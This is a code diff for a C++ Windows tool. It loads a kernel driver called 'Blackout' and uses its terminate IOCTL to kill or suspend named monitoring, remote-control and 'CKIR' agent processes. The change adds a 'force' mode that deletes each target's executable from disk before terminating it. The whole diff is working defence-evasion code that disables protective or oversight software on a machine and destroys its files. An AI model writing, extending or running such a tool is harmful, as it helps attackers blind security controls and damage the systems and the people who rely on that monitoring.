@@ -1,3 +1,4 @@
+#include "main.h"
 #include <Windows.h>
 #include <TlHelp32.h>
 #include <iostream>
@@ -6,14 +7,11 @@ using namespace std;
 #define INITIALIZE_IOCTL_CODE 0x9876C004
 #define TERMINSTE_PROCESS_IOCTL_CODE 0x9876C094
 
-// 0: Default, 1: Force, 2: Resume
-#define BUILD_TYPE 1
-
 typedef long (NTAPI* pNtProcess)(HANDLE proccessHandle);
 pNtProcess NtSuspendProcess;
 pNtProcess NtResumeProcess;
 
-void Elevate() {
+static void Elevate() {
     HANDLE token;
     OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);
     TOKEN_PRIVILEGES tp;
@@ -27,7 +25,7 @@ void Elevate() {
         cout << "Success Privileges.\n";
 }
 
-bool LoadNT() {
+static bool LoadNT() {
     auto ntdll = GetModuleHandleA("ntdll.dll");
     if (!ntdll) return false;
     NtSuspendProcess = (pNtProcess)GetProcAddress(ntdll, "NtSuspendProcess");
@@ -35,7 +33,7 @@ bool LoadNT() {
     return !!NtSuspendProcess;
 }
 
-bool LoadDriver(const char* serviceName, char* driverPath) {
+static bool LoadDriver(const char* serviceName, char* driverPath) {
     SC_HANDLE hSCM, hService;
 
     // Open a handle to the SCM database
@@ -117,7 +115,7 @@ bool LoadDriver(const char* serviceName, char* driverPath) {
     return 1;
 }
 
-bool RemoveDriver(const char* serviceName, char* driverPath) {
+static bool RemoveDriver(const char* serviceName, char* driverPath) {
     SC_HANDLE hSCM, hService;
 
     // Open a handle to the SCM database
@@ -155,13 +153,16 @@ static BOOL CALLBACK TerminateByHWND(HWND hwnd, LPARAM lParam) {
     TerminateData* data = reinterpret_cast<TerminateData*>(lParam);
     GetWindowThreadProcessId(hwnd, &pid);
     if (pid != data->pid) return true;
+    if (!ChangeWindowMessageFilterEx(hwnd, WM_CLOSE, MSGFLT_ALLOW, 0)) {
+        cout << '(' << std::hex << GetLastError() << ')';
+    }
     if (PostMessageA(hwnd, WM_CLOSE, NULL, NULL)) {
         data->terminated = true;
     }
     return true;
 }
 
-static bool TerminateProc(HANDLE terminateHandle, PROCESSENTRY32& procEntry) {
+static bool TerminateProc(HANDLE terminateHandle, PROCESSENTRY32& procEntry, int buildType) {
     DWORD output[2] = { 0 };
     DWORD size = sizeof(output);
     DWORD byteReturned = 0;
@@ -178,15 +179,33 @@ static bool TerminateProc(HANDLE terminateHandle, PROCESSENTRY32& procEntry) {
 		}
 	}
 
-#if BUILD_TYPE == 1
-    TerminateData result(procEntry.th32ProcessID);
-    EnumWindows(TerminateByHWND, reinterpret_cast<long long>(&result));
-    if(result.terminated) {
-        CloseHandle(handle);
-        return true;
+    if (buildType == BUILD_TYPE_FORCE) {
+        TerminateData result(procEntry.th32ProcessID);
+        EnumWindows(TerminateByHWND, reinterpret_cast<long long>(&result));
+        if (handle != NULL) {
+            TCHAR filePath[MAX_PATH] = { 0 };
+            DWORD len = MAX_PATH;
+            if (QueryFullProcessImageNameW(handle, NULL, filePath, &len)) {
+                DeleteFileW(filePath);
+                cout << '[';
+                wcout << filePath;
+                cout << ']';
+            }
+        }
+        if (result.terminated) {
+            if (WaitForSingleObject(handle, 300) != WAIT_OBJECT_0) {
+                if (TerminateProcess(handle, dwExitCode)) {
+                    CloseHandle(handle);
+                    return true;
+                }
+            }
+            else {
+                CloseHandle(handle);
+                return true;
+            }
+        }
+        cout << "Force Terminate Failed(" << std::hex << GetLastError() << ")";
     }
-    cout << "Force Terminate Failed(" << std::hex << GetLastError() << ")";
-#endif
 
     if (NtSuspendProcess) {
         auto result = NtSuspendProcess(handle);
@@ -201,7 +220,7 @@ static bool TerminateProc(HANDLE terminateHandle, PROCESSENTRY32& procEntry) {
 	return false;
 }
 
-bool ResumeProc(HANDLE resumeHandle, PROCESSENTRY32& procEntry) {
+static bool ResumeProc(HANDLE resumeHandle, PROCESSENTRY32& procEntry) {
     auto handle = OpenProcess(PROCESS_ALL_ACCESS, true, procEntry.th32ProcessID);
 
     if (NtSuspendProcess) {
@@ -217,7 +236,7 @@ bool ResumeProc(HANDLE resumeHandle, PROCESSENTRY32& procEntry) {
     return false;
 }
 
-void Unlock() {
+static void Unlock(int buildType) {
     auto terminateHandle = CreateFile(L"\\\\.\\Blackout", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     /*if (terminateHandle == INVALID_HANDLE_VALUE) {
         cout << "INVALID HANDLE\n";
@@ -232,42 +251,30 @@ void Unlock() {
 			|| !wcscmp(procEntry.szExeFile, L"qukapttp.exe") || !wcscmp(procEntry.szExeFile, L"MaestroWebAgent.exe")
             || !wcscmp(procEntry.szExeFile, L"nfowjxyfd.exe")) {
 			cout << "Latest CKIR process ["; wcout << procEntry.szExeFile; cout << "] ";
-#if BUILD_TYPE != 2
-			if (TerminateProc(terminateHandle, procEntry)) cout << "KILLED\n";
-#else
-			if (ResumeProc(terminateHandle, procEntry)) cout << "RESUME\n";
-#endif
+			if (buildType == BUILD_TYPE_RESUME && ResumeProc(terminateHandle, procEntry)) cout << "RESUME\n";
+            else if (TerminateProc(terminateHandle, procEntry, buildType)) cout << "KILLED\n";
 			else cout << "KILL failed\n";
 			continue;
 		}
 		if (!wcscmp(procEntry.szExeFile, L"TDepend64.exe") || !wcscmp(procEntry.szExeFile, L"TDepend.exe")) {
 			cout << "Remote control process ["; wcout << procEntry.szExeFile; cout << "] ";
-#if BUILD_TYPE != 2
-            if (TerminateProc(terminateHandle, procEntry)) cout << "KILLED\n";
-#else
-            if (ResumeProc(terminateHandle, procEntry)) cout << "RESUME\n";
-#endif
+            if (buildType == BUILD_TYPE_RESUME && ResumeProc(terminateHandle, procEntry)) cout << "RESUME\n";
+            else if (TerminateProc(terminateHandle, procEntry, buildType)) cout << "KILLED\n";
 			else cout << "KILL failed\n";
 			continue;
 		}
 		if (!wcscmp(procEntry.szExeFile, L"rwtyijsa.exe") || !wcscmp(procEntry.szExeFile, L"nhfneczzm.exe")) {
 			cout << "Unknown process ["; wcout << procEntry.szExeFile; cout << "] ";
-#if BUILD_TYPE != 2
-            if (TerminateProc(terminateHandle, procEntry)) cout << "KILLED\n";
-#else
-            if (ResumeProc(terminateHandle, procEntry)) cout << "RESUME\n";
-#endif
+            if (buildType == BUILD_TYPE_RESUME && ResumeProc(terminateHandle, procEntry)) cout << "RESUME\n";
+            else if (TerminateProc(terminateHandle, procEntry, buildType)) cout << "KILLED\n";
 			else cout << "KILL failed\n";
 			continue;
 		}
 		if (!wcscmp(procEntry.szExeFile, L"SoluSpSvr.exe") || !wcscmp(procEntry.szExeFile, L"MaestroNAgent.exe")
 			|| !wcscmp(procEntry.szExeFile, L"MaestroNSvr.exe")) {
 			cout << "Legacy CKIR process ["; wcout << procEntry.szExeFile; cout << "] ";
-#if BUILD_TYPE != 2
-            if (TerminateProc(terminateHandle, procEntry)) cout << "KILLED\n";
-#else
-            if (ResumeProc(terminateHandle, procEntry)) cout << "RESUME\n";
-#endif
+            if (buildType == BUILD_TYPE_RESUME && ResumeProc(terminateHandle, procEntry)) cout << "RESUME\n";
+            else if (TerminateProc(terminateHandle, procEntry, buildType)) cout << "KILLED\n";
 			else cout << "KILL failed\n";
 			continue;
 		}
@@ -276,8 +283,9 @@ void Unlock() {
     CloseHandle(terminateHandle);
 }
 
-int main() {
-	cin.tie(0), cout.tie(0)->sync_with_stdio(0);
+void run(int buildType) {
+    cin.tie(0), cout.tie(0)->sync_with_stdio(0);
+    wcin.tie(0), wcout.tie(0)->sync_with_stdio(0);
     Elevate();
 
     WIN32_FIND_DATAA file;
@@ -300,7 +308,7 @@ int main() {
     else
         cout << "NT Load Failed..\n";
 
-	Unlock();
+	Unlock(buildType);
     end:
     if (!RemoveDriver("Blackout", driverPath)) {
         cout << "Service delete failed.\n";
@@ -308,5 +316,4 @@ int main() {
 	cout << "\n\nPress Enter to exit...";
     system("pause");
 	getchar();
-	return 0;
 }
